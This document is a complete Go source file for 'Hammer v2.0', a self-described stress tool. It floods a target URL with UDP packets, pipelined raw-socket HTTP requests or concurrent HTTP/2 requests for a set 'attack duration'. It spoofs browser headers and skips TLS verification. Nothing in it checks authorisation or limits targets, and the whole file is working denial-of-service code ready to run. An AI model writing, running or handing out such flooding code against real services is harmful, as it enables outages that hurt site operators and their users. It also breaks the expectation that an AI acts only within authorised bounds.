package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ---------- stats ----------
var (
	sentTotal   int64
	failedTotal int64
	startTime   time.Time
	statsTicker *time.Time
	mu          sync.RWMutex
	allDone     = make(chan struct{})
)

const version = "Hammer v2.0"

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

// ---------- helpers ----------
func resolveTarget(rawurl string) (scheme, host, port string, ip net.IP) {
	u, err := url.Parse(rawurl)
	if err != nil {
		fmt.Println("[-] Invalid URL:", rawurl)
		os.Exit(1)
	}
	scheme = u.Scheme
	host = u.Hostname()
	port = u.Port()
	if port == "" {
		if scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	ips, err := net.LookupHost(host)
	if err != nil {
		fmt.Println("[-] DNS resolution failed:", host)
		os.Exit(1)
	}
	ip = net.ParseIP(ips[0])
	return
}

// ---------- UDP flood ----------
func udpFlood(targetIP string, port int, threads int, duration time.Duration, size int) {
	var wg sync.WaitGroup
	stop := time.After(duration)
	var localSent int64

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			conn, err := net.DialUDP("udp", nil, &net.UDPAddr{
				IP:   net.ParseIP(targetIP),
				Port: port,
			})
			if err != nil {
				return
			}
			defer conn.Close()

			payload := make([]byte, size)
			for {
				select {
				case <-stop:
					return
				default:
					_, err := conn.Write(payload)
					if err == nil {
						atomic.AddInt64(&localSent, 1)
					}
				}
			}
		}(i)
	}
	wg.Wait()
	atomic.AddInt64(&sentTotal, localSent)
}

// ---------- HTTP client helpers ----------
func newClient(scheme string, h2 bool, timeout time.Duration) *http.Client {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		},
		MaxIdleConns:          0,
		MaxConnsPerHost:       0,
		MaxIdleConnsPerHost:   0,
		IdleConnTimeout:       30 * time.Second,
		DisableCompression:    true,
		DisableKeepAlives:     false,
		ExpectContinueTimeout: 0,
	}

	if scheme == "https" && h2 {
		tr.ForceAttemptHTTP2 = true
	} else {
		tr.TLSNextProto = make(map[string]func(authority string, c *tls.Conn) http.RoundTripper)
	}

	return &http.Client{
		Transport: tr,
		Timeout:   timeout,
	}
}

// ---------- raw socket HTTP sender (pipelining) ----------
func rawPipeliningFlood(host, port, method, rawpath, body string, h2 bool, duration time.Duration, workers int) {
	stop := time.After(duration)
	var wg sync.WaitGroup

	dialFn := func() (net.Conn, error) {
		addr := net.JoinHostPort(host, port)
		if port == "443" || strings.Contains(port, "443") {
			conf := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
			return tls.Dial("tcp", addr, conf)
		}
		return net.DialTimeout("tcp", addr, 10*time.Second)
	}

	buildRequest := func() []byte {
		u := rawpath
		if u == "" {
			u = "/"
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, u))
		sb.WriteString(fmt.Sprintf("Host: %s\r\n", host))
		sb.WriteString("User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n")
		sb.WriteString("Accept: */*\r\n")
		sb.WriteString("Accept-Language: en-US,en;q=0.9\r\n")
		sb.WriteString("Accept-Encoding: gzip\r\n")
		sb.WriteString("Connection: keep-alive\r\n")
		sb.WriteString("Cache-Control: no-cache\r\n")
		sb.WriteString("Pragma: no-cache\r\n")
		if method == "POST" && body != "" {
			sb.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(body)))
			sb.WriteString("Content-Type: application/x-www-form-urlencoded\r\n")
		}
		sb.WriteString("\r\n")
		if method == "POST" && body != "" {
			sb.WriteString(body)
		}
		return []byte(sb.String())
	}

	req := buildRequest()
	pipelineCount := 100

	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
				}

				conn, err := dialFn()
				if err != nil {
					time.Sleep(500 * time.Millisecond)
					continue
				}

				buf := make([]byte, 4096)
				burstStart := time.Now()

				for piped := 0; piped < pipelineCount; piped++ {
					select {
					case <-stop:
						return
					default:
					}
					_, err := conn.Write(req)
					if err != nil {
						atomic.AddInt64(&failedTotal, int64(pipelineCount-piped))
						break
					}
					atomic.AddInt64(&sentTotal, 1)
				}

				// drain responses
				for i := 0; i < pipelineCount; i++ {
					conn.SetReadDeadline(time.Now().Add(2 * time.Second))
					_, err := conn.Read(buf)
					if err != nil {
						break
					}
				}
				_ = burstStart
				conn.Close()
			}
		}(w)
	}
	wg.Wait()
}

// ---------- HTTP/2 goroutine flood ----------
func httpFlood(client *http.Client, target, method, body string, workers int, duration time.Duration) {
	stop := time.After(duration)
	var wg sync.WaitGroup

	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			for {
				select {
				case <-stop:
					return
				default:
				}

				var req *http.Request
				var err error
				if method == "POST" && body != "" {
					req, err = http.NewRequest(method, target, strings.NewReader(body))
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				} else {
					req, err = http.NewRequest(method, target, nil)
				}
				if err != nil {
					continue
				}

				req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
				req.Header.Set("Accept", "*/*")
				req.Header.Set("Accept-Language", "en-US,en;q=0.9")
				req.Header.Set("Cache-Control", "no-cache")
				req.Header.Set("Connection", "keep-alive")

				resp, err := client.Do(req)
				if err != nil {
					atomic.AddInt64(&failedTotal, 1)
					time.Sleep(100 * time.Millisecond)
					continue
				}
				// read and discard body
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
				atomic.AddInt64(&sentTotal, 1)
			}
		}(w)
	}
	wg.Wait()
}

// ---------- stats reporter ----------
func statsReporter(stop <-chan struct{}) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	var prev int64
	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
			current := atomic.LoadInt64(&sentTotal)
			rps := current - prev
			prev = current
			fails := atomic.LoadInt64(&failedTotal)
			elapsed := time.Since(startTime).Seconds()

			// Clear line and print
			fmt.Printf("\r[+] RPS: %-8d | Total Sent: %-12d | Failed: %-8d | Elapsed: %-6.1fs | Workers: %d",
				rps, current, fails, elapsed, runtime.NumCPU())
		}
	}
}

// ---------- main ----------
func main() {
	target := flag.String("target", "", "Target URL (e.g. http://example.com)")
	method := flag.String("method", "GET", "HTTP method: GET, POST, HEAD")
	threads := flag.Int("threads", runtime.NumCPU()*10, "Number of goroutine workers")
	duration := flag.Int("duration", 30, "Attack duration in seconds")
	body := flag.String("body", "", "POST body data")
	udp := flag.Bool("udp", false, "Enable UDP flood mode")
	udpPort := flag.Int("udp-port", 80, "UDP target port")
	udpSize := flag.Int("udp-size", 1400, "UDP payload size in bytes")
	h2 := flag.Bool("h2", false, "Enable HTTP/2")
	pipeline := flag.Bool("pipeline", true, "Enable HTTP pipelining (raw sockets)")
	path := flag.String("path", "/", "Custom URL path")
	flag.Parse()

	fmt.Printf(`
╔══════════════════════════════════════╗
║         %s          ║
║     Multi-Protocol Stress Tool      ║
╚══════════════════════════════════════╝

`, version)

	if *target == "" {
		fmt.Println("Usage: ./hammer -target <url> [options]")
		flag.PrintDefaults()
		os.Exit(1)
	}

	runtime.GOMAXPROCS(runtime.NumCPU())
	startTime = time.Now()

	fmt.Printf("[✓] Target:      %s\n", *target)
	fmt.Printf("[✓] Method:      %s\n", *method)
	fmt.Printf("[✓] Workers:     %d\n", *threads)
	fmt.Printf("[✓] Duration:    %ds\n", *duration)
	fmt.Printf("[✓] HTTP/2:      %v\n", *h2)
	fmt.Printf("[✓] Pipelining:  %v\n", *pipeline)
	fmt.Printf("[✓] CPU Cores:   %d\n", runtime.NumCPU())
	fmt.Printf("[✓] UDP Flood:   %v\n", *udp)
	fmt.Println(strings.Repeat("─", 46))

	// Start stats reporter
	stopStats := make(chan struct{})
	go statsReporter(stopStats)

	stopTimer := time.After(time.Duration(*duration) * time.Second)
	done := make(chan struct{})

	if *udp {
		scheme, host, port, ip := resolveTarget(*target)
		_ = scheme
		_ = host
		p := *udpPort
		if p == 80 && port != "" {
			p, _ = strconv.Atoi(port)
		}
		go func() {
			udpFlood(ip.String(), p, *threads, time.Duration(*duration)*time.Second, *udpSize)
			close(done)
		}()
	} else if *pipeline {
		scheme, host, port, _ := resolveTarget(*target)
		p := port
		if *target != "" {
			u, _ := url.Parse(*target)
			if u.Port() == "" {
				if scheme == "https" {
					p = "443"
				} else {
					p = "80"
				}
			}
		}
		rp := *path
		if rp == "/" {
			u, err := url.Parse(*target)
			if err == nil && u.Path != "" {
				rp = u.Path
			}
		}
		go func() {
			rawPipeliningFlood(host, p, *method, rp, *body, *h2, time.Duration(*duration)*time.Second, *threads)
			close(done)
		}()
	} else {
		scheme, _, _, _ := resolveTarget(*target)
		client := newClient(scheme, *h2, 30*time.Second)
		go func() {
			httpFlood(client, *target, *method, *body, *threads, time.Duration(*duration)*time.Second)
			close(done)
		}()
	}

	// Wait for duration
	<-stopTimer
	close(stopStats)
	<-done

	elapsed := time.Since(startTime).Seconds()
	fmt.Printf("\n\n┌─ Attack Complete ──────────────────────────┐\n")
	fmt.Printf("│ Total Requests:  %-32d │\n", atomic.LoadInt64(&sentTotal))
	fmt.Printf("│ Failed:          %-32d │\n", atomic.LoadInt64(&failedTotal))
	fmt.Printf("│ Avg RPS:         %-32.0f │\n", float64(atomic.LoadInt64(&sentTotal))/elapsed)
	fmt.Printf("│ Duration:        %-32.2fs │\n", elapsed)
	fmt.Printf("└──────────────────────────────────────────────┘\n")
}


